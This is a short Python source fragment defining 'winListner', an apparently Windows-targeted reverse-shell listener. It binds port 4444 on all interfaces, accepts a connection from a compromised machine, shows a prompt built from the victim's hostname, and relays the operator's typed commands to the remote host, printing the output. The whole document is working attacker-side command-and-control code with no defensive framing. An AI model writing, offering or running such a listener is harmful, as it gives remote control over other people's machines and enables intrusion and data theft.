
def winListner():
    import socket, os, sys
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',4444))
    s.listen(1)
    conn,addr = s.accept()
    print ('session opened at %s:%s'%(addr[0],addr[1]))
    print('\n')
    hostname = conn.recv(1024)
    while 1:
        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
        if cmd == 'quit':
            conn.close
            s.close
            sys.exit()
        command = conn.send(cmd)
        result = conn.recv(1024)
        print(result)

    

